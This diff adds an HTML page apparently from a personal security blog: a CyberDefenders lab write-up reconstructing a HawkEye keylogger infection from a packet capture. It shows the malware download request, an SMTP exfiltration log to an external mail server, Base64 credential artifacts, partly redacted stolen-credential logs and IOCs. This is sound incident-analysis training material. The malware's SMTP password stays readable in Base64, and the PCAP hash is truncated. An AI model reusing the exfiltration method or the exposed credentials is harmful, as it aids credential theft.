@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>HawkEye Keylogger — Network Forensics Writeup</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+  <style>
+    .writeup-layout .hero h1 {
+      max-width: 100%;
+      font-size: clamp(3rem, 7vw, 6.2rem);
+      line-height: 0.95;
+      letter-spacing: -0.06em;
+    }
+
+    .title-line { display: block; }
+
+    .gradient-word {
+      display: inline-block;
+      background: linear-gradient(90deg, #bff3ff, #38bdf8, #22d3ee);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .kill-chain {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 1rem;
+      margin-top: 1.2rem;
+    }
+
+    .kill-step {
+      padding: 1rem;
+      border: 1px solid rgba(56, 189, 248, 0.22);
+      border-radius: 18px;
+      background: rgba(8, 18, 35, 0.56);
+    }
+
+    .kill-step span {
+      display: block;
+      margin-bottom: .45rem;
+      color: #67e8f9;
+      font-family: "JetBrains Mono", monospace;
+      font-size: .78rem;
+      text-transform: uppercase;
+      letter-spacing: .08em;
+    }
+
+    .ioc-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 1rem;
+    }
+
+    .ioc-card {
+      padding: 1rem;
+      border: 1px solid rgba(148, 163, 184, 0.18);
+      border-radius: 18px;
+      background: rgba(15, 23, 42, 0.52);
+    }
+
+    .ioc-card h3 {
+      margin-bottom: .6rem;
+      font-size: 1rem;
+    }
+  </style>
+</head>
+
+<body>
+  <header class="topbar">
+    <div class="wrap topbar-inner">
+      <a class="brand" href="/">ThaiNgoc :~$</a>
+      <nav class="nav">
+        <a href="/">Home</a>
+        <a class="active" href="/writeups/">Writeups</a>
+        <a href="/projects/">Projects</a>
+        <a href="/achievements/">Achievements</a>
+        <a href="/contact/">Contact</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap writeup-layout">
+    <aside class="toc glass-card">
+      <div class="toc-title">Contents</div>
+      <a href="#summary">Executive Summary</a>
+      <a href="#lab">Lab Context</a>
+      <a href="#triage">PCAP Triage</a>
+      <a href="#endpoints">Endpoints</a>
+      <a href="#delivery">Payload Delivery</a>
+      <a href="#payload">Payload Extraction</a>
+      <a href="#smtp">SMTP Exfiltration</a>
+      <a href="#decode">Base64 Decoding</a>
+      <a href="#pattern">Exfil Pattern</a>
+      <a href="#mitre">MITRE ATT&CK</a>
+      <a href="#timeline">Timeline</a>
+      <a href="#iocs">IOCs</a>
+      <a href="#answers">Lab Answers</a>
+      <a href="#lessons">Lessons Learned</a>
+    </aside>
+
+    <article class="writeup-content">
+      <section class="hero glass-card">
+        <p class="eyebrow">CyberDefenders · Network Forensics · HawkEye Keylogger</p>
+        <h1>
+          <span class="title-line">HawkEye</span>
+          <span class="title-line gradient-word">Keylogger</span>
+          <span class="title-line">Exfiltration</span>
+        </h1>
+        <p class="hero-subtitle">
+          Reconstructing an invoice-themed malware delivery and repeated SMTP credential
+          exfiltration incident from a packet capture using Wireshark, CyberChef and IOC enrichment.
+        </p>
+
+        <div class="meta-grid">
+          <div><span>Platform</span><strong>CyberDefenders</strong></div>
+          <div><span>Category</span><strong>Network Forensics</strong></div>
+          <div><span>Difficulty</span><strong>Medium</strong></div>
+          <div><span>Tools</span><strong>Wireshark · CyberChef · VirusTotal</strong></div>
+        </div>
+      </section>
+
+      <section id="summary" class="glass-card section-card">
+        <h2>Executive Summary</h2>
+        <p>
+          This investigation analyzed <code>stealer.pcap</code>, a network trace involving an accountant
+          who received an invoice-themed email containing a download link. Shortly after the file was
+          downloaded, the host began sending repeated SMTP messages containing Base64-encoded password logs.
+        </p>
+        <p>
+          The infected workstation was identified as <code>10.4.10.132</code> / <code>BEIJING-5CD1-PC</code>.
+          It downloaded a Windows executable named <code>tkraw_Protected99.exe</code> from
+          <code>proforma-invoices.com</code>, which resolved to <code>217.182.138.150</code>. The exported
+          payload was later confirmed as malicious through hash-based enrichment.
+        </p>
+        <p>
+          The key finding was SMTP-based credential exfiltration to <code>23.229.162.69:587</code>. The
+          malware authenticated to the mail server using Base64-encoded credentials, then sent emails to
+          <code>sales.del@macwinlogistics.in</code>. Decoding the message subject and body revealed
+          <code>HawkEye Keylogger - Reborn v9</code> password logs containing browser and Outlook credentials.
+        </p>
+
+        <div class="callout danger">
+          <strong>Impact:</strong> Confirmed malware download, credential theft, browser credential extraction,
+          Outlook/POP3 credential theft, and repeated SMTP exfiltration approximately every 10 minutes.
+        </div>
+      </section>
+
+      <section id="lab" class="glass-card section-card">
+        <h2>Lab Context</h2>
+        <p>
+          The scenario begins with an accountant receiving an invoice-related email containing a download link.
+          Suspicious traffic was observed after the link was opened. My goal was to reconstruct the incident,
+          identify the infected host, recover the downloaded malware artifact, decode exfiltrated data, and
+          produce a clear IOC and ATT&CK mapping.
+        </p>
+
+        <div class="table-wrap">
+          <table>
+            <tr><th>Field</th><th>Value</th></tr>
+            <tr><td>Lab</td><td>HawkEye</td></tr>
+            <tr><td>Evidence</td><td><code>stealer.pcap</code></td></tr>
+            <tr><td>Primary Technique Observed</td><td>SMTP credential exfiltration</td></tr>
+            <tr><td>Malware Identified</td><td><code>HawkEye Keylogger - Reborn v9</code></td></tr>
+            <tr><td>Author</td><td>Nguyen Thai Ngoc</td></tr>
+          </table>
+        </div>
+      </section>
+
+      <section id="triage" class="glass-card section-card">
+        <h2>1. Initial PCAP Triage</h2>
+        <p>
+          I started with the capture file properties before jumping into packet-level analysis. In real SOC work,
+          this step is important because it confirms the evidence window, packet count, hash values, and whether
+          the capture timeframe is relevant to the alert or incident ticket.
+        </p>
+
+        <div class="table-wrap">
+          <table>
+            <tr><th>Field</th><th>Value</th></tr>
+            <tr><td>File</td><td><code>stealer.pcap</code></td></tr>
+            <tr><td>Total Packets</td><td><code>4003</code></td></tr>
+            <tr><td>First Packet</td><td><code>2019-04-10 20:37 UTC</code></td></tr>
+            <tr><td>Duration</td><td><code>01:03:41</code></td></tr>
+            <tr><td>PCAP SHA256</td><td><code>2216927c1136d29078dfbc20be9d6b1b13f47f95c758acc47a1fb424e51</code></td></tr>
+            <tr><td>PCAP SHA1</td><td><code>084d3ade8ce928e0233b69275c8554a86d9670ab</code></td></tr>
+          </table>
+        </div>
+
+        <p>
+          I also reviewed the Protocol Hierarchy. HTTP consumed most of the bytes, while SMTP was present and
+          immediately interesting because keyloggers and stealers often use email as a simple exfiltration channel.
+        </p>
+      </section>
+
+      <section id="endpoints" class="glass-card section-card">
+        <h2>2. Endpoint and Host Identification</h2>
+        <p>
+          The most active internal host at the network level was <code>10.4.10.132</code>. The local environment
+          used private addressing with a <code>/24</code> netmask, and three internal systems were involved in the capture.
+        </p>
+
+        <div class="table-wrap">
+          <table>
+            <tr><th>Item</th><th>Finding</th></tr>
+            <tr><td>Most active link-layer host</td><td><code>00:08:02:1c:47:ae</code></td></tr>
+            <tr><td>NIC vendor</td><td>Hewlett-Packard</td></tr>
+            <tr><td>Vendor headquarters</td><td>Palo Alto</td></tr>
+            <tr><td>Victim internal IP</td><td><code>10.4.10.132</code></td></tr>
+            <tr><td>Victim hostname</td><td><code>BEIJING-5CD1-PC</code></td></tr>
+            <tr><td>Victim OS</td><td><code>Windows NT 6.1</code></td></tr>
+            <tr><td>Organization DNS server</td><td><code>10.4.10.4</code></td></tr>
+          </table>
+        </div>
+
+        <p>
+          The hostname <code>BEIJING-5CD1-PC</code> appeared later in SMTP traffic and in the decoded exfiltration
+          subject, which tied the network-level host to the credential theft activity.
+        </p>
+      </section>
+
+      <section id="delivery" class="glass-card section-card">
+        <h2>3. HTTP Payload Delivery</h2>
+        <p>
+          I filtered for HTTP requests and found a suspicious executable download. There were no useful HTTP POST
+          requests for exfiltration; instead, the important HTTP evidence was a GET request for a Windows executable.
+        </p>
+
+        <pre><code>GET /proforma/tkraw_Protected99.exe HTTP/1.1
+Host: proforma-invoices.com
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0)</code></pre>
+
+        <p>The server responded with a file download:</p>
+
+        <pre><code>HTTP/1.1 200 OK
+Content-Type: application/x-msdownload
+Content-Length: 202472
+Server: LiteSpeed</code></pre>
+
+        <p>
+          Following the HTTP stream revealed <code>MZ</code>, <code>PE</code>, and the classic
+          <code>This program cannot be run in DOS mode</code> string, confirming that the response body was a Windows
+          executable rather than a document or normal invoice file.
+        </p>
+
+        <div class="callout">
+          <strong>Assessment:</strong> <code>proforma-invoices.com</code> was used as the invoice-themed malware
+          delivery domain. The executable <code>tkraw_Protected99.exe</code> was the likely HawkEye payload.
+        </div>
+      </section>
+
+      <section id="payload" class="glass-card section-card">
+        <h2>4. Payload Extraction and Hashing</h2>
+        <p>
+          To recover the downloaded object, I used Wireshark's <code>File → Export Objects → HTTP</code> feature.
+          The exported object list showed <code>tkraw_Protected99.exe</code> from <code>proforma-invoices.com</code>
+          with content type <code>application/x-msdownload</code> and a size of approximately <code>202 kB</code>.
+        </p>
+
+        <pre><code>md5sum tkraw_Protected99.exe
+sha1sum tkraw_Protected99.exe
+sha256sum tkraw_Protected99.exe
+file tkraw_Protected99.exe</code></pre>
+
+        <pre><code>71826ba081e303866ce2a2534491a2f7  tkraw_Protected99.exe
+b482d64a43f6bfbf758166ecba680b7f0c59a4f7  tkraw_Protected99.exe
+62099532750dad1054b127689680c38590033fa0bdfa4fb40c7b4dcb2607fb11  tkraw_Protected99.exe
+tkraw_Protected99.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 5 sections</code></pre>
+
+        <p>
+          After hashing, I treated the file as malware and renamed the extension to reduce the risk of accidental
+          execution during analysis.
+        </p>
+
+        <pre><code>mv tkraw_Protected99.exe tkraw_Protected99.exe.malware</code></pre>
+
+        <p>
+          I then searched the SHA256 hash in VirusTotal. The file was flagged by <code>57/71</code> security vendors
+          and labeled with categories such as <code>trojan</code>, <code>dropper</code>, <code>autoit</code>, and
+          <code>hawkeye</code>. This enriched the PCAP evidence and confirmed that the exported HTTP object was malicious.
+        </p>
+      </section>
+
+      <section id="smtp" class="glass-card section-card">
+        <h2>5. SMTP Exfiltration Discovery</h2>
+        <p>
+          After confirming the payload download, I pivoted to SMTP traffic because the protocol hierarchy showed
+          mail traffic and HawkEye-style stealers commonly send stolen logs by email. Filtering on SMTP revealed
+          connections from <code>10.4.10.132</code> to <code>23.229.162.69:587</code>.
+        </p>
+
+        <pre><code>220-p3plcpnl0413.prod.phx3.secureserver.net ESMTP Exim 4.91
+EHLO Beijing-5cd1-PC
+AUTH login c2FsZXMuZGVsQG1hY3dpbmxvZ2lzdGljcy5pbg==
+334 UGFzc3dvcmQ6
+U2FsZXNAMjM=
+235 Authentication succeeded
+MAIL FROM:&lt;sales.del@macwinlogistics.in&gt;
+RCPT TO:&lt;sales.del@macwinlogistics.in&gt;
+DATA
+Content-Transfer-Encoding: base64</code></pre>
+
+        <p>
+          This stream showed that the infected host authenticated to an external SMTP server, then sent data from
+          <code>sales.del@macwinlogistics.in</code> back to the same mailbox. The mail server banner identified the
+          software as <code>Exim 4.91</code>.
+        </p>
+      </section>
+
+      <section id="decode" class="glass-card section-card">
+        <h2>6. Decoding Base64 SMTP Artifacts</h2>
+        <p>
+          The SMTP stream contained several Base64-encoded fields. I copied each encoded value into CyberChef and
+          used the <strong>From Base64</strong> recipe to recover the plaintext values.
+        </p>
+
+        <div class="table-wrap">
+          <table>
+            <tr><th>Artifact</th><th>Encoded Value</th><th>Decoded Meaning</th></tr>
+            <tr>
+              <td>SMTP username</td>
+              <td><code>c2FsZXMuZGVsQG1hY3dpbmxvZ2lzdGljcy5pbg==</code></td>
+              <td><code>sales.del@macwinlogistics.in</code></td>
+            </tr>
+            <tr>
+              <td>SMTP password</td>
+              <td><code>U2FsZXNAMjM=</code></td>
+              <td><code>Sales***</code> redacted for public writeup</td>
+            </tr>
+            <tr>
+              <td>Email subject</td>
+              <td><code>SGF3a0V5ZSBLZXlsb2dnZXIgLSBSZWJvcm4gdjkgLSBQYXNzd29yZHMgTG9ncyAtIHJvbWFuLm1jZ3VpcmUgXCBCRUlKSU5HLTVDRDEtUEMgLSAxNzMuNjYuMTQ2LjExMg==</code></td>
+              <td><code>HawkEye Keylogger - Reborn v9 - Passwords Logs - roman.mcguire \ BEIJING-5CD1-PC - 173.66.146.112</code></td>
+            </tr>
+          </table>
+        </div>
+
+        <p>
+          The decoded subject identified the malware variant, victim user, victim hostname, and public IP address.
+          The message body also used Base64 transfer encoding and decoded into password logs collected from the host.
+        </p>
+
+        <pre><code>HawkEye Keylogger - Reborn v9
+Passwords Logs
+roman.mcguire \ BEIJING-5CD1-PC
+
+URL               : https://login.aol.com/account/challenge/password
+Web Browser       : Internet Explorer 7.0 - 9.0
+User Name         : roman.mcguire914@aol.com
+Password          : P@ssw***
+
+URL               : https://www.bankofamerica.com/
+Web Browser       : Chrome
+User Name         : roman.mcguire
+Password          : P@ssw***
+Filename          : C:\Users\roman.mcguire\AppData\Local\Google\Chrome\User Data\Default\Login Data
+
+Application       : MS Outlook 2002/2003/2007/2010
+Email             : roman.mcguire@pizzajukebox.com
+Server            : pop.pizzajukebox.com
+Type              : POP3
+User              : roman.mcguire
+Password          : P@ssw***
+SMTP Server       : smtp.pizzajukebox.com
+SMTP Server Port  : 587</code></pre>
+
+        <div class="callout danger">
+          <strong>Confirmed theft:</strong> The decoded body contained browser credentials, Bank of America access
+          credentials, and Outlook/POP3 mail credentials. Password values are intentionally redacted in this public writeup.
+        </div>
+      </section>
+
+      <section id="pattern" class="glass-card section-card">
+        <h2>7. Repeated Exfiltration Pattern</h2>
+        <p>
+          I continued searching through SMTP traffic and found multiple sessions with the same authentication flow,
+          same sender and recipient mailbox, same Base64-encoded HawkEye subject, and same password log body format.
+          This proved the malware was not performing a single one-time exfiltration event.
+        </p>
+
+        <div class="table-wrap">
+          <table>
+            <tr><th>Time</th><th>Source</th><th>Destination</th><th>Protocol</th><th>Finding</th></tr>
+            <tr><td><code>03:37:54</code></td><td><code>10.4.10.132</code></td><td><code>217.182.138.150:80</code></td><td>HTTP</td><td>Downloaded <code>tkraw_Protected99.exe</code></td></tr>
+            <tr><td><code>03:38:16</code></td><td><code>10.4.10.132</code></td><td><code>23.229.162.69:587</code></td><td>SMTP</td><td>First HawkEye password log exfiltration</td></tr>
+            <tr><td><code>03:48:20</code></td><td><code>10.4.10.132</code></td><td><code>23.229.162.69:587</code></td><td>SMTP</td><td>Repeated SMTP exfiltration</td></tr>
+            <tr><td><code>04:18:34</code></td><td><code>10.4.10.132</code></td><td><code>23.229.162.69:587</code></td><td>SMTP</td><td>Repeated SMTP exfiltration</td></tr>
+            <tr><td><code>04:28:38</code></td><td><code>10.4.10.132</code></td><td><code>23.229.162.69:587</code></td><td>SMTP</td><td>Repeated SMTP exfiltration</td></tr>
+            <tr><td><code>04:38:42</code></td><td><code>10.4.10.132</code></td><td><code>23.229.162.69:587</code></td><td>SMTP</td><td>Repeated SMTP exfiltration</td></tr>
+          </table>
+        </div>
+
+        <p>
+          Several attempts occurred at approximately 10-minute intervals. This pattern is consistent with HawkEye
+          repeatedly collecting and sending credential logs through mail protocol traffic.
+        </p>
+      </section>
+
+      <section id="mitre" class="glass-card section-card">
+        <h2>8. MITRE ATT&CK Mapping</h2>
+        <p>
+          Based on the observed PCAP evidence, the incident maps to the following ATT&CK techniques.
+        </p>
+
+        <div class="table-wrap">
+          <table>
+            <tr><th>Tactic</th><th>Technique</th><th>Evidence</th></tr>
+            <tr><td>Initial Access</td><td><code>T1566.002 - Spearphishing Link</code></td><td>Invoice-themed scenario with download link.</td></tr>
+            <tr><td>Execution</td><td><code>T1204.002 - User Execution: Malicious File</code></td><td>Downloaded executable followed by malware traffic. Execution is inferred from scenario and subsequent exfiltration.</td></tr>
+            <tr><td>Command and Control</td><td><code>T1105 - Ingress Tool Transfer</code></td><td>HTTP download of <code>tkraw_Protected99.exe</code> from external server.</td></tr>
+            <tr><td>Credential Access</td><td><code>T1056.001 - Input Capture: Keylogging</code></td><td>Email subject identified <code>HawkEye Keylogger - Reborn v9</code>.</td></tr>
+            <tr><td>Credential Access</td><td><code>T1555.003 - Credentials from Web Browsers</code></td><td>Decoded body contained Chrome <code>Login Data</code> credentials.</td></tr>
+            <tr><td>Credential Access</td><td><code>T1555 - Credentials from Password Stores</code></td><td>Decoded body contained Outlook/POP3 stored credentials.</td></tr>
+            <tr><td>Collection</td><td><code>T1005 - Data from Local System</code></td><td>Credential logs were collected from the local user profile.</td></tr>
+            <tr><td>Command and Control</td><td><code>T1071.003 - Application Layer Protocol: Mail Protocols</code></td><td>SMTP over port <code>587</code> used for communication.</td></tr>
+            <tr><td>Exfiltration</td><td><code>T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol</code></td><td>Stolen password logs sent over SMTP with only Base64 transfer encoding.</td></tr>
+            <tr><td>Defense Evasion</td><td><code>T1027 - Obfuscated Files or Information</code></td><td>SMTP auth values, subject, and body were Base64 encoded.</td></tr>
+          </table>
+        </div>
+      </section>
+
+      <section id="timeline" class="glass-card section-card">
+        <h2>9. Final Timeline</h2>
+        <div class="kill-chain">
+          <div class="kill-step"><span>20:37 UTC</span>First packet captured. Investigation window begins.</div>
+          <div class="kill-step"><span>03:37:54</span>Victim downloads <code>tkraw_Protected99.exe</code> from <code>proforma-invoices.com</code>.</div>
+          <div class="kill-step"><span>03:38:16</span>First SMTP exfiltration observed to <code>23.229.162.69:587</code>.</div>
+          <div class="kill-step"><span>03:48:20</span>Second SMTP exfiltration using same account and same HawkEye subject.</div>
+          <div class="kill-step"><span>04:18:34</span>Additional exfiltration session observed.</div>
+          <div class="kill-step"><span>04:28:38</span>Repeated SMTP credential log delivery.</div>
+          <div class="kill-step"><span>04:38:42</span>Final observed SMTP exfiltration session in the capture.</div>
+        </div>
+      </section>
+
+      <section id="iocs" class="glass-card section-card">
+        <h2>10. Indicators of Compromise</h2>
+        <div class="ioc-grid">
+          <div class="ioc-card">
+            <h3>Victim</h3>
+            <p><code>10.4.10.132</code></p>
+            <p><code>BEIJING-5CD1-PC</code></p>
+            <p><code>roman.mcguire</code></p>
+            <p><code>173.66.146.112</code></p>
+          </div>
+
+          <div class="ioc-card">
+            <h3>Payload Delivery</h3>
+            <p><code>proforma-invoices.com</code></p>
+            <p><code>217.182.138.150</code></p>
+            <p><code>/proforma/tkraw_Protected99.exe</code></p>
+            <p><code>tkraw_Protected99.exe</code></p>
+          </div>
+
+          <div class="ioc-card">
+            <h3>Payload Hashes</h3>
+            <p><code>71826ba081e303866ce2a2534491a2f7</code></p>
+            <p><code>b482d64a43f6bfbf758166ecba680b7f0c59a4f7</code></p>
+            <p><code>62099532750dad1054b127689680c38590033fa0bdfa4fb40c7b4dcb2607fb11</code></p>
+          </div>
+
+          <div class="ioc-card">
+            <h3>SMTP Exfiltration</h3>
+            <p><code>23.229.162.69</code></p>
+            <p><code>p3plcpnl0413.prod.phx3.secureserver.net</code></p>
+            <p><code>Exim 4.91</code></p>
+            <p><code>sales.del@macwinlogistics.in</code></p>
+          </div>
+        </div>
+      </section>
+
+      <section id="answers" class="glass-card section-card">
+        <h2>11. Lab Answers Summary</h2>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Question</th><th>Answer</th></tr>
+            <tr><td>Packets in capture</td><td><code>4003</code></td></tr>
+            <tr><td>First packet captured UTC</td><td><code>2019-04-10 20:37</code></td></tr>
+            <tr><td>Capture duration</td><td><code>01:03:41</code></td></tr>
+            <tr><td>Most active MAC</td><td><code>00:08:02:1c:47:ae</code></td></tr>
+            <tr><td>NIC manufacturer</td><td>Hewlett-Packard</td></tr>
+            <tr><td>Manufacturer headquarters</td><td>Palo Alto</td></tr>
+            <tr><td>Internal computers involved</td><td><code>3</code></td></tr>
+            <tr><td>Most active computer</td><td><code>BEIJING-5CD1-PC</code></td></tr>
+            <tr><td>DNS server</td><td><code>10.4.10.4</code></td></tr>
+            <tr><td>Domain queried in packet 204</td><td><code>proforma-invoices.com</code></td></tr>
+            <tr><td>Resolved IP</td><td><code>217.182.138.150</code></td></tr>
+            <tr><td>Resolved IP country</td><td>France</td></tr>
+            <tr><td>Victim OS</td><td><code>Windows NT 6.1</code></td></tr>
+            <tr><td>Malicious file</td><td><code>tkraw_Protected99.exe</code></td></tr>
+            <tr><td>Payload MD5</td><td><code>71826ba081e303866ce2a2534491a2f7</code></td></tr>
+            <tr><td>Malware hosting web server</td><td><code>LiteSpeed</code></td></tr>
+            <tr><td>Victim public IP</td><td><code>173.66.146.112</code></td></tr>
+            <tr><td>Email server country</td><td>United States</td></tr>
+            <tr><td>Email server software</td><td><code>Exim 4.91</code></td></tr>
+            <tr><td>Exfil destination account</td><td><code>sales.del@macwinlogistics.in</code></td></tr>
+            <tr><td>SMTP password used by malware</td><td><code>Sales***</code></td></tr>
+            <tr><td>Malware variant</td><td><code>Reborn v9</code></td></tr>
+            <tr><td>Bank of America credential</td><td><code>roman.mcguire:P@ssw***</code></td></tr>
+            <tr><td>Exfiltration interval</td><td><code>10 minutes</code></td></tr>
+          </table>
+        </div>
+      </section>
+
+      <section id="lessons" class="glass-card section-card">
+        <h2>Lessons Learned</h2>
+        <p>
+          This lab reinforced why an analyst should begin with capture metadata, protocol hierarchy, and endpoint
+          statistics before diving into streams. That triage quickly separated high-volume HTTP payload delivery
+          from lower-volume but more critical SMTP exfiltration.
+        </p>
+        <p>
+          The most important lesson was that Base64 is not encryption. In this case, the malware used Base64 for
+          SMTP authentication fields, the email subject, and the message body. A simple CyberChef decode exposed
+          the malware family, host identity, public IP address, and stolen credentials.
+        </p>
+        <p>
+          Finally, repeated SMTP sessions were more valuable than a single decoded credential. They showed behavior:
+          HawkEye was configured to periodically send collected password logs, which is exactly the kind of pattern
+          a SOC analyst should capture in a timeline, detection idea, and ATT&CK mapping.
+        </p>
+      </section>
+    </article>
+  </main>
+
+  <script src="/assets/js/main.js"></script>
+</body>
+</html>
